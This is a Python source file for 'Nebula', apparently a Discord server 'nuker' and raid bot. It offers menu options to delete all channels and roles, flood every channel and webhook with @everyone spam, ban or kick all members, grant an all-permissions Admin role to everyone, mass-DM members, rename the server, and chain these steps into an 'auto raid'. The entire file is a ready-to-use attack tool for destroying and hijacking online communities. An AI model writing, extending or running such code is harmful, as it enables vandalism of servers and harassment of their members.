import os
import time
import discord
from discord.ext import commands
from pystyle import Colors, Colorate
import random
import config
import urllib.request
import asyncio
import time
import requests
from discord import Game
from discord import Activity, ActivityType


def get_latest_release_version(repo_owner, repo_name):
    url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest'
    response = requests.get(url)
    
    if response.status_code == 200:
        release_info = response.json()
        latest_version = release_info['tag_name']
        return latest_version
    else:
        print(f"Error in the request : {response.status_code}")
        return None

def update_application(repo_owner, repo_name, current_version):
    latest_version = get_latest_release_version(repo_owner, repo_name)

    if latest_version is not None and current_version < latest_version:
        print(f"A new version is available : {latest_version}")
        
        download_url = f'https://github.com/{repo_owner}/{repo_name}/archive/{latest_version}.zip'
        download_path = 'latest_version.zip'
        
        with requests.get(download_url, stream=True) as response:
            with open(download_path, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    file.write(chunk)
        

        
        
        print("Update Finished.")
        exit()
    else:
        pass
        

repo_owner = 'Nyxoy201'
repo_name = 'nebula'
current_version = 'v1.3.2'

update_application(repo_owner, repo_name, current_version)

async def delete_channel(channel):
    try:
        start_time = time.time() 
        await channel.delete()
        end_time = time.time()  
        print((Colorate.Color(Colors.green, f"[+] Channel {channel.name} deleted - Time taken: {end_time - start_time:.2f} seconds")))
        return True
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't delete channel {channel.name}: {e}")))
        return False

async def delete_role(role):
    try:
        start_time = time.time()
        await role.delete()
        end_time = time.time()
        print((Colorate.Color(Colors.green, f"[+] Role {role.name} deleted - Time taken: {end_time - start_time:.2f} seconds")))
        return True
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't delete role {role.name}: {e}")))
        return False

async def nuke(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  
            channel_futures = [delete_channel(channel) for channel in guild.channels]

            role_futures = [delete_role(role) for role in guild.roles]

            channel_results = await asyncio.gather(*channel_futures)
            role_results = await asyncio.gather(*role_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)

            roles_deleted = role_results.count(True)
            roles_not_deleted = role_results.count(False)

            print((Colorate.Color(Colors.blue, f"""[!] Command Used: Nuke - {channels_deleted} channels deleted, {channels_not_deleted} channels not deleted 
{roles_deleted} roles deleted, {roles_not_deleted} roles not deleted - Total Time taken: {end_time_total - start_time_total:.2f} seconds""")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)

        end_time = time.time()
        print((Colorate.Color(Colors.green, f"[+] Channel Created: {new_channel.name} ({new_channel.id}) - Time taken: {end_time - start_time:.2f} seconds")))
        return True
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't create {channel_type} channel: {e}")))
        return False

async def create_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_channels = int(input((Colorate.Color(Colors.blue, "Enter the number of channels to create: "))))
            channel_type = input((Colorate.Color(Colors.blue, "Enter channel type (text/voice): ")))
            channel_name = input((Colorate.Color(Colors.blue, "Enter channel name: ")))

            if channel_type not in ['text', 'voice']:
                print((Colorate.Color(Colors.red, "[-] Invalid channel type. Please use 'text' or 'voice'.")))
                return

            channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            start_time_total = time.time()  
            channel_results = await asyncio.gather(*channel_futures)
            end_time_total = time.time()  

            channels_created = channel_results.count(True)
            channels_not_created = channel_results.count(False)

            print((Colorate.Color(Colors.blue, f"[!] Command Used: Create Channels - {channels_created} {channel_type} channels created, {channels_not_created} channels not created - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))


async def spam_channel(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = int(input((Colorate.Color(Colors.blue, "Enter the number of messages to send: "))))
            message_content = input((Colorate.Color(Colors.blue, "Enter the message content or 'embed' to use config embed: ")))

            include_everyone = False
            if message_content.lower() == 'embed':
                include_everyone_input = input((Colorate.Color(Colors.blue, "Include @everyone ? (yes/no): "))).lower()
                include_everyone = include_everyone_input == 'yes'

            start_time_total = time.time()
            tasks = [
                send_messages_to_channels(channel, num_messages, message_content, include_everyone)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            print((Colorate.Color(Colors.blue, f"[!] Command Used: Spam - {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

async def send_messages_to_channels(channel, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            if message_content.lower() == 'embed':
                await send_embed(channel, include_everyone)
            else:
                await channel.send(message_content)
                print((Colorate.Color(Colors.green, f"[+] Message Sent to {channel.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't send messages to {channel.name}: {e}")))

async def send_embed(channel, include_everyone=False):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await channel.send(content=message, embed=embed)
        print((Colorate.Color(Colors.green, f"[+] Embed Sent to {channel.name}")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't send embed to {channel.name}: {e}")))


from config import NO_BAN_KICK_ID

async def ban_all(server_id, bot_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            confirm = input((Colorate.Color(Colors.blue, "Are you sure you want to ban all members? (yes/no): "))).lower()
            if confirm == "yes":
                start_time_total = time.time()
                tasks = [
                    ban_member(member, bot_id)
                    for member in guild.members
                ]
                results = await asyncio.gather(*tasks)
                end_time_total = time.time()

                members_banned = results.count(True)
                members_failed = results.count(False)

                print((Colorate.Color(Colors.blue, f"[!] Command Used: Ban All - {members_banned} members banned, {members_failed} members not banned - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
            else:
                print((Colorate.Color(Colors.red, "[-] Ban all operation canceled.")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

async def ban_member(member, bot_id):
    try:
        if member.id not in NO_BAN_KICK_ID and member.id != bot_id:
            await member.ban()
            print((Colorate.Color(Colors.green, f"[+] Member {member.name} banned")))
            return True
        else:
            if member.id == bot_id:
                pass
            else:
                print((Colorate.Color(Colors.yellow, f"[+] Member {member.name} is in the whitelist, no ban.")))
            return False
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't ban {member.name}: {e}")))
        return False

    
async def create_role(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_roles = int(input((Colorate.Color(Colors.blue, "Enter the number of roles to create: "))))
            role_name = input((Colorate.Color(Colors.blue, "Enter the name of the role: ")))

            roles_created = 0

            start_time_total = time.time() 
            for _ in range(num_roles):
                try:
                    start_time_role = time.time() 
                    color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

                    new_role = await guild.create_role(name=role_name, colour=color)
                    end_time_role = time.time() 
                    print((Colorate.Color(Colors.green, f"[+] Role Created: {new_role.name} ({new_role.id}) - Time taken: {end_time_role - start_time_role:.2f} seconds")))
                    roles_created += 1
                except Exception as e:
                    print((Colorate.Color(Colors.red, f"[-] Can't create role {role_name}: {e}")))

            end_time_total = time.time()  
            print((Colorate.Color(Colors.blue, f"[!] Command Used: Create Roles - {roles_created} roles created - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

async def dm_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            message_content = input((Colorate.Color(Colors.blue, "Enter the message to send to all members: ")))

            members_sent = 0
            members_fail = 0

            start_time_total = time.time()  
            for member in guild.members:
                if not member.bot:
                    try:
                        start_time_member = time.time() 
                        await member.send(message_content)
                        end_time_member = time.time() 
                        print((Colorate.Color(Colors.green, f"[+] Message Sent to {member.name} ({member.id}) - Time taken: {end_time_member - start_time_member:.2f} seconds")))
                        members_sent += 1
                    except Exception as e:
                        print((Colorate.Color(Colors.red, f"[-] Can't send message to {member.name}: {e}")))
                        members_fail += 1

            end_time_total = time.time()  
            print((Colorate.Color(Colors.blue, f"[!] Command Used: DM All - {members_sent} messages sent, {members_fail} messages failed - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))


from config import NO_BAN_KICK_ID

async def kick_all(server_id, bot_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            confirm = input((Colorate.Color(Colors.blue, "Are you sure you want to kick all members? (yes/no): "))).lower()
            if confirm == "yes":
                start_time_total = time.time()
                tasks = [
                    kick_member(member, bot_id)
                    for member in guild.members
                ]
                results = await asyncio.gather(*tasks)
                end_time_total = time.time()

                members_kicked = results.count(True)
                members_failed = results.count(False)

                print((Colorate.Color(Colors.blue, f"[!] Command Used: Kick All - {members_kicked} members kicked, {members_failed} members not kicked - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
            else:
                print((Colorate.Color(Colors.red, "[-] Kick all operation canceled.")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

async def kick_member(member, bot_id):
    try:
        if member.id not in NO_BAN_KICK_ID and member.id != bot_id:
            await member.kick()
            print((Colorate.Color(Colors.green, f"[+] Member {member.name} kicked")))
            return True
        else:
            if member.id == bot_id:
                pass
            else:
                print((Colorate.Color(Colors.yellow, f"[+] Member {member.name} is in the whitelist, no kick.")))
            return False
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't kick {member.name}: {e}")))
        return False
    
async def get_admin(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            user_id_or_all = input((Colorate.Color(Colors.blue, "Enter the user ID or press Enter for the entire server: ")))

            color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            start_time_total = time.time()  

            admin_role = await guild.create_role(name="Admin", colour=color, permissions=discord.Permissions.all())

            if not user_id_or_all:
                for member in guild.members:
                    try:
                        if not member.bot:
                            start_time_member = time.time()  
                            await member.add_roles(admin_role)
                            end_time_member = time.time()  
                            print((Colorate.Color(Colors.green, f"[+] Admin role granted to {member.name} - Time taken: {end_time_member - start_time_member:.2f} seconds")))
                    except Exception as e:
                        print((Colorate.Color(Colors.red, f"[-] Can't grant admin role to {member.name}: {e}")))

                end_time_total = time.time() 
                print((Colorate.Color(Colors.blue, f"[!] Command Used: Get Admin - Admin role granted to the entire server - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))

            else:
                try:
                    user_id = int(user_id_or_all)
                    target_user = await guild.fetch_member(user_id)
                    if target_user:
                        start_time_target_user = time.time()
                        await target_user.add_roles(admin_role)
                        end_time_target_user = time.time()
                        print((Colorate.Color(Colors.green, f"[+] Admin role granted to {target_user.name} - Time taken: {end_time_target_user - start_time_target_user:.2f} seconds")))
                        print((Colorate.Color(Colors.blue, f"[!] Command Used: Get Admin - Admin role granted to the entire server - Total Time taken: {end_time_target_user - start_time_target_user:.2f} seconds")))
                    else:
                        print((Colorate.Color(Colors.red, f"[-] User with ID {user_id_or_all} not found.")))

                except ValueError:
                    print((Colorate.Color(Colors.red, "[-] Invalid user ID. Please enter a valid user ID or press Enter for the entire server.")))

        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))


async def change_server(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            server_config = config.SERVER_CONFIG

            new_name = input((Colorate.Color(Colors.blue, f"Enter the new server name or press enter for config name: "))) or server_config['new_name']
            new_icon = input((Colorate.Color(Colors.blue, f"Enter the URL of the new server icon or press enter for config icon: "))) or server_config['new_icon']
            new_description = input((Colorate.Color(Colors.blue, f"Enter the new server description or press enter for config descritpion: "))) or server_config['new_description']
            start_time_guild_changer = time.time()
            await guild.edit(name=new_name)
            print((Colorate.Color(Colors.green, f"[+] Server name changed")))

            if new_icon:
                with urllib.request.urlopen(new_icon) as response:
                    icon_data = response.read()
                await guild.edit(icon=icon_data)
                print((Colorate.Color(Colors.green, f"[+] Icon changed")))

            await guild.edit(description=new_description)
            print((Colorate.Color(Colors.green, f"[+] Description changed")))
            end_time_guild_changer = time.time()

            print((Colorate.Color(Colors.blue, f"[!] Command Used: Change Server - Server information updated successfully - Total Time taken: {end_time_guild_changer - start_time_guild_changer:.2f} seconds")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

async def spam_webhooks(guild):
    try:
        webhook_config = config.WEBHOOK_CONFIG

        webhooks = []
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                webhook_name = webhook_config["default_name"]
                webhook = await channel.create_webhook(name=webhook_name)
                print((Colorate.Color(Colors.green, f"[+] Webhook Created for {channel.name}: {webhook.name} ({webhook.url})")))
                webhooks.append(webhook)

        num_messages = int(input((Colorate.Color(Colors.blue, "Enter the number of messages to send: "))))

        message_content = input((Colorate.Color(Colors.blue, "Enter the message content or 'embed' to use config embed: ")))

        include_everyone = False
        if message_content.lower() == 'embed':
            include_everyone_input = input((Colorate.Color(Colors.blue, "Include @everyone ? (yes/no): "))).lower()
            include_everyone = include_everyone_input == 'yes'
        start_time_spam = time.time()
        tasks = [
            send_embed_webhook(webhook, num_messages, message_content, include_everyone)
            if message_content.lower() == 'embed'
            else send_regular_webhook(webhook, num_messages, message_content)
            for webhook in webhooks
        ]
        await asyncio.gather(*tasks)
        end_time_target_spam = time.time()

        print((Colorate.Color(Colors.blue, f"[!] Command Used: Spam - {num_messages} messages sent via webhooks - Total Time taken: {end_time_target_spam - start_time_spam:.2f} seconds")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

async def send_embed_webhook(webhook, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            await send_embed_webhook_message(webhook, include_everyone)
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't send messages via Webhook {webhook.name}: {e}")))

async def send_embed_webhook_message(webhook, include_everyone):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await webhook.send(content=message, embed=embed)
        print((Colorate.Color(Colors.green, f"[+] Embed Sent via Webhook {webhook.name}")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't send embed via Webhook {webhook.name}: {e}")))

async def send_regular_webhook(webhook, num_messages, message_content):
    try:
        for _ in range(num_messages):
            await webhook.send(content=message_content)
            print((Colorate.Color(Colors.green, f"[+] Message Sent via Webhook {webhook.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't send messages via Webhook {webhook.name}: {e}")))

async def webhook_spam(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            await spam_webhooks(guild)
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

from config import AUTO_RAID_CONFIG

def log_message(color, message):
    print(Colorate.Color(color, message))

async def delete_channel(channel):
    try:
        start_time = time.time() 
        await channel.delete()
        end_time = time.time()  
        log_message(Colors.green, f"[+] Channel {channel.name} deleted - Time taken: {end_time - start_time:.2f} seconds")
        return True
    except Exception as e:
        log_message(Colors.red, f"[-] Can't delete channel {channel.name}: {e}")
        return False

async def delete_role(role):
    try:
        start_time = time.time()
        await role.delete()
        end_time = time.time()
        log_message(Colors.green, f"[+] Role {role.name} deleted - Time taken: {end_time - start_time:.2f} seconds")
        return True
    except Exception as e:
        log_message(Colors.red, f"[-] Can't delete role {role.name}: {e}")
        return False

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)

        end_time = time.time()
        log_message(Colors.green, f"[+] Channel Created: {new_channel.name} ({new_channel.id}) - Time taken: {end_time - start_time:.2f} seconds")
        return new_channel
    except Exception as e:
        log_message(Colors.red, f"[-] Can't create {channel_type} channel: {e}")
        return None
    
async def send_messages_to_channel(channel, num_messages, message_content, include_everyone):
    try:
        for i in range(num_messages):
            await channel.send(message_content)
            log_message(Colors.yellow, f"[-] Message {i+1}/{num_messages} sent to channel {channel.name}")
        return True
    except Exception as e:
        log_message(Colors.red, f"[-] Can't send messages to channel {channel.name}: {e}")
        return False

    
async def spam_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = AUTO_RAID_CONFIG['num_messages']
            message_content = AUTO_RAID_CONFIG['message_content']

            start_time_total = time.time()
            tasks = [
                send_messages_to_channel(channel, num_messages, message_content, False)  
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            log_message(Colors.blue, f"[!] Command Used: Spam - {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")
        else:
            log_message(Colors.red, "[-] Guild not found.")
    except Exception as e:
        log_message(Colors.red, f"[-] Error: {e}")

async def auto_raid(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  

            num_channels = AUTO_RAID_CONFIG['num_channels']
            channel_type = AUTO_RAID_CONFIG['channel_type']
            channel_name = AUTO_RAID_CONFIG['channel_name']

            channel_futures = [delete_channel(channel) for channel in guild.channels]

            create_channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            channel_results = await asyncio.gather(*channel_futures)
            create_channel_results = await asyncio.gather(*create_channel_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)

            channels_created = create_channel_results.count(True)
            channels_not_created = create_channel_results.count(False)

            await spam_channels(server_id)

            log_message(Colors.blue, f"""[!] Command Used: Nuke - {channels_deleted} channels deleted, {channels_not_deleted} channels not deleted 
[!] Command Used: Create Channels - {channels_created} {channel_type} channels created, {channels_not_created} channels not created - Total Time taken: {end_time_total - start_time_total:.2f} seconds""")

        else:
            log_message(Colors.red, "[-] Guild not found.")
    except Exception as e:
        log_message(Colors.red, f"[-] Error: {e}")



get_latest_release_version(repo_owner, repo_name)
bot_token = input((Colorate.Color(Colors.blue, "Enter Bot Token: ")))
server_id = input((Colorate.Color(Colors.blue, "Enter Server ID: ")))

intents = discord.Intents.all()  
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print((Colorate.Color(Colors.blue, f'[+] {bot.user.name} is online!')))
    print((Colorate.Color(Colors.blue, f'[+] Server ID: {server_id}')))

    server = bot.get_guild(int(server_id))
    if server:
        print((Colorate.Color(Colors.green, f'[+] Bot is in the specified server ({server.name})')))
        

    else:
        print((Colorate.Color(Colors.red, f'[-] Bot is not in the specified server')))
        return
    
    from config import BOT_PRESENCE
    presence_type = getattr(ActivityType, BOT_PRESENCE["type"].lower())
    await bot.change_presence(activity=Activity(type=presence_type, name=BOT_PRESENCE["text"]))

    time.sleep(2)


    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        choice = input((Colorate.Color(Colors.blue, """

                            ███╗   ██╗███████╗██████╗ ██╗   ██╗██╗      █████╗ 
                            ████╗  ██║██╔════╝██╔══██╗██║   ██║██║     ██╔══██╗
                            ██╔██╗ ██║█████╗  ██████╔╝██║   ██║██║     ███████║
                            ██║╚██╗██║██╔══╝  ██╔══██╗██║   ██║██║     ██╔══██║
                            ██║ ╚████║███████╗██████╔╝╚██████╔╝███████╗██║  ██║
                            ╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                              V1.3.2                                                                                
                                       
    ╔═══════════════════════════════╦═══════════════════════════════╦═══════════════════════════════╗                                       
    ║           1 - Nuke            ║       2 - Create Channels     ║      3 - Spam Channels        ║
    ╠═══════════════════════════════╬═══════════════════════════════╬═══════════════════════════════╣                                       
    ║        4 - Webhook Spam       ║         5 - Kick All          ║          6 - Ban All          ║
    ╠═══════════════════════════════╬═══════════════════════════════╬═══════════════════════════════╣
    ║        7 - Create Roles       ║         8 - Get Admin         ║       9 - Change Server       ║
    ╚═══════════════╦═══════════════╩═══════════════╦═══════════════╩═══════════════╦═══════════════╝
                    ║        10 - DM All            ║         11 - Auto Raid        ║    
                    ╚═══════════════════════════════╩═══════════════════════════════╝

    Choice :  """)))

        if choice == '1':
            await nuke(server_id)
        elif choice == '2':
            await create_channels(server_id)
        elif choice == '3':
            await spam_channel(server_id)
        elif choice == '6':
            await ban_all(server_id, bot.user.id)
        elif choice == '5':
            await kick_all(server_id, bot.user.id)
        elif choice == '10':
            await dm_all(server_id)
        elif choice == '7':
            await create_role(server_id)
        elif choice == '8':
            await get_admin(server_id)
        elif choice == '9':
            await change_server(server_id)
        elif choice == '4':
            await webhook_spam(server_id)   
        elif choice == '11':
            await auto_raid(server_id)        
        else:
            print((Colorate.Color(Colors.red, "[-] Invalid choice")))

        time.sleep(4)

if __name__ == "__main__":
    bot.run(bot_token)
